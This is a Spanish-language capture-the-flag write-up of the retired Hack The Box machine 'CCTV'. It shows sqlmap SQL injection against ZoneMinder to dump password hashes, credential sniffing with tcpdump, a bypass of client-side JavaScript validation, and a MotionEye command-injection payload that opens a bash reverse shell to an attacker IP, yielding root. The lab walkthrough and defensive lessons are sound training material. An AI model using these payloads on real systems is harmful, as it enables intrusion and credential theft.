# Writeup: CCTV (Hack The Box — Retirada)

CCTV es una máquina **Fácil** que expone un panel de ZoneMinder con credenciales por defecto, vulnerable a inyección SQL. A partir de ahí, se extraen hashes de la base de datos, se crackea la contraseña de un usuario, se captura tráfico con `tcpdump` para obtener credenciales de `sa_mark`, y finalmente se explota una inyección de comandos en MotionEye (**CVE-2025-60787**) para obtener acceso root.

---

## Fase 1: Reconocimiento

```bash
sudo nmap -sS -p- --min-rate 500 -n -Pn -vvv 10.129.56.93 -oG allPorts
```

**Resultado:**

```bash
Discovered open port 80/tcp on 10.129.56.93
Discovered open port 22/tcp on 10.129.56.93
```

```bash
nmap -sVC -p 22,80 10.129.56.93 -oN targeted
```

**Resultado:**

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|_  256 76:1d:73:98:fa:05:f7:0b:04:c2:3b:c4:7d:e6:db:4a (ECDSA)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://cctv.htb/
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Añadimos el dominio a `/etc/hosts`:

```bash
echo "10.129.56.93 cctv.htb" >> /etc/hosts
```

---

## Fase 2: Enumeración Web — ZoneMinder

Al acceder a `http://cctv.htb`, empezamos a analizar la página web en busca de alguna funcionalidad. A la derecha encontramos un botón de login que nos lleva a un panel de autenticación. Investigando, identificamos que se trata de **ZoneMinder**, un sistema de videovigilancia de código abierto.

Investigando en Internet, encontramos que las versiones antiguas de ZoneMinder utilizaban credenciales por defecto. Probamos `admin:admin` y logramos acceder. Una vez dentro, comprobamos la versión: **v1.37.63**.

---

## Fase 3: SQL Injection en ZoneMinder (CVE-2024-51482)

Investigando vulnerabilidades conocidas para ZoneMinder v1.37.63, encontramos que el endpoint `/zm/index.php?view=request&request=event&action=removetag&tid=1` es vulnerable a **inyección SQL**, identificada como **CVE-2024-51482**. El parámetro `tid` se introduce directamente en una consulta SQL sin sanitizar. El PoC indica que la vulnerabilidad es de tipo **booleana**, aunque en la práctica también se puede explotar como **time‑based blind**.

### Explotación con sqlmap

Siguiendo el PoC, intentamos con la técnica booleana:

```bash
sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie='ZMSESSID=i4ot7nta3vvva975np1ehmc3uk' --technique=B --current-db
```

Pero no obtuvimos buenos resultados:

```bash
[18:43:21] [WARNING] GET parameter 'request' does not seem to be injectable
[18:43:21] [INFO] testing if GET parameter 'action' is dynamic
[18:43:22] [INFO] GET parameter 'action' appears to be dynamic
[18:43:23] [WARNING] heuristic (basic) test shows that GET parameter 'action' might not be injectable
[18:43:24] [INFO] testing for SQL injection on GET parameter 'action'
[18:43:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:43:24] [WARNING] reflective value(s) found and filtering out
[18:43:30] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:43:31] [WARNING] GET parameter 'action' does not seem to be injectable
[18:43:31] [INFO] testing if GET parameter 'tid' is dynamic
[18:43:31] [WARNING] GET parameter 'tid' does not appear to be dynamic
[18:43:32] [WARNING] heuristic (basic) test shows that GET parameter 'tid' might not be injectable
[18:43:33] [INFO] testing for SQL injection on GET parameter 'tid'
[18:43:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:43:38] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:43:40] [WARNING] GET parameter 'tid' does not seem to be injectable
[18:43:40] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '-level'/'--risk' options if you wish to perform more tests. Rerun without providing the option '--technique'. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[18:43:40] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 14 times
```

Probamos un enfoque más general, eliminando la restricción de técnica:

```bash
sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie='ZMSESSID=i4ot7nta3vvva975np1ehmc3uk'
```

**Resultado:**

```bash
[18:50:09] [INFO] GET parameter 'tid' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[18:50:20] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[18:50:20] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[18:50:21] [INFO] checking if the injection point on GET parameter 'tid' is a false positive
GET parameter 'tid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 278 HTTP(s) requests:
---
Parameter: tid (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: view=request&request=event&action=removetag&tid=1 AND (SELECT 1915 FROM (SELECT(SLEEP(5)))BVrX)
---
```

Confirmamos que el parámetro `tid` es vulnerable a inyección SQL **time‑based**, aunque el PoC original la clasificaba como booleana.

### Extracción de hashes

Siendo ZoneMinder un proyecto open source, investigamos en Internet la estructura de su base de datos y averiguamos que la tabla `Users` contiene las columnas `Username` y `Password`. Construimos el siguiente comando para volcar las credenciales:

```bash
sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie='ZMSESSID=i4ot7nta3vvva975np1ehmc3uk' -p tid --technique=T -D zm -T Users -C Username,Password --dump
```

**Resultado:**

```bash
superadmin:$2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm
mark:$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
admin:$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m
```

### Crackeo del hash

Guardamos el hash de `mark` en un archivo y lo crackeamos con `hashcat` (modo 3200, bcrypt):

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

```bash
mark:opensesame
```

---

## Fase 4: Enumeración de archivos de log

Con las credenciales de `mark`, nos conectamos por SSH:

```bash
ssh mark@cctv.htb
```

Enumerando el sistema, encontramos un archivo de log interesante:

```bash
cat /opt/video/backups/server.log
```

```bash
Authorization as sa_mark successful. Command issued: status. Outcome: success. 2026-07-14 00:53:27
Authorization as sa_mark successful. Command issued: disk-info. Outcome: success. 2026-07-14 00:54:26
Authorization as sa_mark successful. Command issued: status. Outcome: success. 2026-07-14 00:55:16
Authorization as sa_mark successful. Command issued: disk-info. Outcome: success. 2026-07-14 00:55:53
...
```

Este log indica que existe un usuario **`sa_mark`** y un servicio que acepta comandos como `status` y `disk-info`.

---

## Fase 5: Enumeración de servicios internos

Revisamos los puertos abiertos localmente:

```bash
ss -nltp
```

```bash
State            Recv-Q           Send-Q                     Local Address:Port                      Peer Address:Port          Process          
LISTEN           0                4096                           127.0.0.1:8888                           0.0.0.0:*                              
LISTEN           0                128                            127.0.0.1:8765                           0.0.0.0:*                              
LISTEN           0                4096                       127.0.0.53%lo:53                             0.0.0.0:*                              
LISTEN           0                4096                          127.0.0.54:53                             0.0.0.0:*                              
LISTEN           0                4096                           127.0.0.1:9081                           0.0.0.0:*                              
LISTEN           0                70                             127.0.0.1:33060                          0.0.0.0:*                              
LISTEN           0                4096                           127.0.0.1:8554                           0.0.0.0:*                              
LISTEN           0                4096                           127.0.0.1:1935                           0.0.0.0:*                              
LISTEN           0                4096                           127.0.0.1:7999                           0.0.0.0:*                              
LISTEN           0                151                            127.0.0.1:3306                           0.0.0.0:*                              
LISTEN           0                4096                             0.0.0.0:22                             0.0.0.0:*                              
LISTEN           0                511                                    *:80                                   *:*                              
LISTEN           0                4096                                [::]:22                                [::]:*
```

### Uso de linpeas.sh

Ejecutamos `linpeas.sh` y encontramos información relevante:

```bash
tcpdump is configured with `cap_net_raw`, which means any user can capture packets

Available Sniffing Tools (T1040)
tcpdump is available
tcpdump version 4.99.4
/usr/bin/tcpdump cap_net_raw=eip
Sniffable interfaces according to tcpdump -D:
1.eth0 [Up, Running, Connected]
2.br-1b6b4b93c636 [Up, Running, Connected]
3.br-3e74116c4022 [Up, Running, Connected]
4.vethab0768f [Up, Running, Connected]
5.vethef8dbad [Up, Running, Connected]
6.veth05040e3 [Up, Running, Connected]
7.veth225c90f [Up, Running, Connected]
8.any (Pseudo-device that captures on all interfaces) [Up, Running]
9.lo [Up, Running, Loopback]
10.docker0 [Up, Disconnected]
11.bluetooth-monitor (Bluetooth Linux Monitor) [Wireless]
12.nflog (Linux netfilter log (NFLOG) interface) [none]
13.nfqueue (Linux netfilter queue (NFQUEUE) interface) [none]
14.dbus-system (D-Bus system bus) [none]
15.dbus-session (D-Bus session bus) [none]
```

### Captura de tráfico con tcpdump

Aprovechando que `tcpdump` tiene `cap_net_raw`, capturamos tráfico durante unos minutos:

```bash
tcpdump -i any -w /tmp/captura_docker.pcap
```

Luego analizamos el archivo capturado en busca de credenciales:

```bash
tcpdump -r /tmp/captura_docker.pcap -A | grep -i -E "pass|user|auth|login|sa_mark"
```

**Resultado:**

```bash
User-Agent: Lavf60.16.100
User-Agent: Lavf60.16.100
User-Agent: Lavf60.16.100
..6...%gUSERNAME=sa_mark;PASSWORD=X1l9fx1ZjS7RZb;CMD=disk-info
..6...%gUSERNAME=sa_mark;PASSWORD=X1l9fx1ZjS7RZb;CMD=disk-info
User-Agent: Lavf60.16.100
User-Agent: Lavf60.16.100
User-Agent: Lavf60.16.100
........USERNAME=sa_mark;PASSWORD=X1l9fx1ZjS7RZb;CMD=status
........USERNAME=sa_mark;PASSWORD=X1l9fx1ZjS7RZb;CMD=status
```

Obtenemos las credenciales de **`sa_mark`**: **`X1l9fx1ZjS7RZb`**.

---

## Fase 6: Acceso como `sa_mark`

Nos conectamos por SSH:

```bash
ssh sa_mark@cctv.htb
```

```bash
$ id
uid=1001(sa_mark) gid=1001(sa_mark) groups=1001(sa_mark)
$ ls
'SecureVision Staff Announcement.pdf'   user.txt
$ cat user.txt
[REDACTED]
```

Obtenemos la **flag de usuario** (`user.txt`).

Descargamos el archivo PDF a nuestra máquina local:

```bash
# En la máquina víctima (como sa_mark)
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
# En nuestra máquina Kali
wget http://cctv.htb:8000/SecureVision%20Staff%20Announcement.pdf
```

El PDF contiene información sobre la migración a ZoneMinder y una pista sobre el sistema antiguo, que alude al servicio MotionEye que encontramos en el puerto 8765.

---

## Fase 7: MotionEye — Inyección de comandos (CVE-2025-60787)

El puerto 8765 corresponde a **MotionEye**. Comprobamos la versión:

```bash
pip show motioneye | grep Version
Version: 0.43.1b4
```

MotionEye v0.43.1b4 es vulnerable a **inyección de comandos** (**CVE-2025-60787**). El problema es que no teníamos credenciales para acceder a la interfaz web de MotionEye en ese momento.

### Port forwarding

Para poder acceder a la interfaz web de MotionEye desde nuestra máquina local, realizamos port forwarding:

```bash
ssh -L 8765:127.0.0.1:8765 sa_mark@cctv.htb
```

Ahora podemos acceder a `http://127.0.0.1:8765` desde nuestro navegador. Usamos las credenciales que obtuvimos de `sa_mark` (usuario `admin` y contraseña `X1l9fx1ZjS7RZb`). Logramos autenticarnos con **`admin:X1l9fx1ZjS7RZb`**.

### Explotación — Inyección de comandos

Siguiendo el PoC disponible en el [advisory de GitHub](https://github.com/advisories/GHSA-j945-qm58-4gjx):

1. Iniciamos sesión en MotionEye con `admin:X1l9fx1ZjS7RZb`.
2. En el panel ya existía una cámara configurada, por lo que no fue necesario añadir una nueva. Accedemos a la configuración de esa cámara.
3. Intentamos inyectar un payload en el campo **Image File Name** (dentro de la configuración de la cámara, en la sección "Still Images").
4. El campo tiene validación del lado del cliente (JavaScript). Abrimos la consola del navegador (F12) y ejecutamos:

   ```js
   configUiValid = function() { return true; };
   ```

   Esto desactiva la validación.

5. Establecemos el **Capture Mode** a `Interval Snapshots` y el **Interval** a `10` segundos.
6. Para probar la inyección, primero usamos un payload sencillo que crea un archivo en `/tmp`:

   ```bash
   $(touch /tmp/test).%Y-%m-%d-%H-%M-%S
   ```

7. Guardamos los cambios y verificamos que el archivo se creó:

   ```bash
   ls -la /tmp
   ```

   ```bash
   total 3440
   drwxrwxrwt 19 root     root        4096 Jul 14 22:23 .
   drwxr-xr-x 23 root     root        4096 Mar  2 09:49 ..
   -rw-rw-r--  1 mark     mark     3437580 Jul 14 18:26 captura_docker.pcap
   drwxrwxrwt  2 root     root        4096 Jul 14 17:14 .font-unix
   drwxrwxrwt  2 root     root        4096 Jul 14 17:14 .ICE-unix
   drwxr-xr-x  2 root     root        4096 Jul 14 17:14 MotionEye
   drwx------  2 root     root        4096 Jul 14 17:14 snap-private-tmp
   drwx------  3 root     root        4096 Jul 14 17:14 systemd-private-4ad3ff2f729240f28b3ebd0652765974-apache2.service-gBn1Yv
   drwx------  3 root     root        4096 Jul 14 17:37 systemd-private-4ad3ff2f729240f28b3ebd0652765974-fwupd.service-EU1K9X
   drwx------  3 root     root        4096 Jul 14 17:14 systemd-private-4ad3ff2f729240f28b3ebd0652765974-ModemManager.service-3S60fG
   drwx------  3 root     root        4096 Jul 14 17:14 systemd-private-4ad3ff2f729240f28b3ebd0652765974-polkit.service-mk8cYo
   drwx------  3 root     root        4096 Jul 14 17:14 systemd-private-4ad3ff2f729240f28b3ebd0652765974-systemd-logind.service-4LSDz0
   drwx------  3 root     root        4096 Jul 14 17:14 systemd-private-4ad3ff2f729240f28b3ebd0652765974-systemd-resolved.service-VAL0Tp
   drwx------  3 root     root        4096 Jul 14 17:14 systemd-private-4ad3ff2f729240f28b3ebd0652765974-systemd-timesyncd.service-FvQszY
   drwx------  3 root     root        4096 Jul 14 17:37 systemd-private-4ad3ff2f729240f28b3ebd0652765974-upower.service-DeqNQ4
   -rw-r--r--  1 root     root           0 Jul 14 22:23 test
   -rwxrwxr-x  1 mark     mark          51 Jul 14 17:48 test.sh
   drwx------  2 mark     mark        4096 Jul 14 18:13 tmux-1000
   drwx------  2 root     root        4096 Jul 14 17:14 vmware-root_659-4013788787
   drwxrwxrwt  2 root     root        4096 Jul 14 17:14 .X11-unix
   drwxrwxrwt  2 root     root        4096 Jul 14 17:14 .XIM-unix
   drwxr-xr-x  2 www-data www-data    4096 Jul 14 17:14 zm
   ```

   El archivo `/tmp/test` fue creado con éxito, confirmando la ejecución de comandos.

8. Ahora, en el campo **Image File Name** introducimos el payload para obtener una reverse shell:

   ```bash
   $(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/10.10.17.44/443 0>&1\"')").%Y-%m-%d-%H-%M-%S
   ```

9. Guardamos los cambios y esperamos a que Motion ejecute el comando.

Mientras tanto, en nuestra máquina Kali, iniciamos un listener:

```bash
nc -nlvp 443
```

Recibimos la conexión:

```bash
connect to [10.10.17.44] from (UNKNOWN) [10.129.244.156] 36866
bash: cannot set terminal process group (50975): Inappropriate ioctl for device
bash: no job control in this shell
root@cctv:/etc/motioneye# id
uid=0(root) gid=0(root) groups=0(root)
```

Somos **root**.

---

## Fase 8: Obtención de la flag de root

```bash
root@cctv:/etc/motioneye# cat /root/root.txt
[REDACTED]
```

¡Misión cumplida!

---

## Conclusión

CCTV es una máquina **Fácil** que combina:

1. **Credenciales por defecto** en ZoneMinder (`admin:admin`).
2. **SQL Injection time‑based** en ZoneMinder para extraer hashes de la base de datos.
3. **Crackeo de hash** para obtener la contraseña de `mark`.
4. **Enumeración de archivos de log** que revelan la existencia del usuario `sa_mark`.
5. **Captura de tráfico** con `tcpdump` (gracias a `cap_net_raw`) para obtener credenciales de `sa_mark`.
6. **Acceso SSH** como `sa_mark` y obtención de `user.txt`.
7. **Port forwarding** para acceder a la interfaz web de MotionEye.
8. **Autenticación** en MotionEye con `admin:X1l9fx1ZjS7RZb`.
9. **Inyección de comandos** (**CVE-2025-60787**) para obtener una reverse shell como `root`.
10. **Obtención de la flag de root**.

---

## Lecciones aprendidas

1. **Las credenciales por defecto en aplicaciones web son un riesgo crítico**  
   ZoneMinder permitía el acceso con `admin:admin`. Cambiar las contraseñas predeterminadas inmediatamente después de la instalación es fundamental.

2. **Las inyecciones SQL en aplicaciones legacy siguen siendo un vector efectivo**  
   Aunque ZoneMinder es un proyecto activo, versiones antiguas (como la 1.37.63) contienen vulnerabilidades críticas como **CVE-2024-51482**. Mantener el software actualizado es esencial.
3. **El análisis de logs puede revelar información sensible**  
   El archivo `server.log` indicaba la existencia de un usuario y comandos, lo que guió la enumeración.

4. **Las capacidades de `tcpdump` permiten a cualquier usuario capturar tráfico en la red local**  
   Con `cap_net_raw`, cualquier usuario puede espiar el tráfico de la máquina, lo que permitió capturar credenciales en texto plano.

5. **Las validaciones del lado del cliente son fácilmente eludibles**  
   La interfaz de MotionEye solo validaba en el navegador; con una simple línea de JavaScript se desactivó la protección.

6. **El principio de mínimo privilegio se aplica también a contenedores**  
   MotionEye se ejecutaba como `root` , lo que permitió obtener una shell con privilegios máximos. Ejecutar servicios con usuarios no privilegiados reduce el impacto de una eventual RCE.


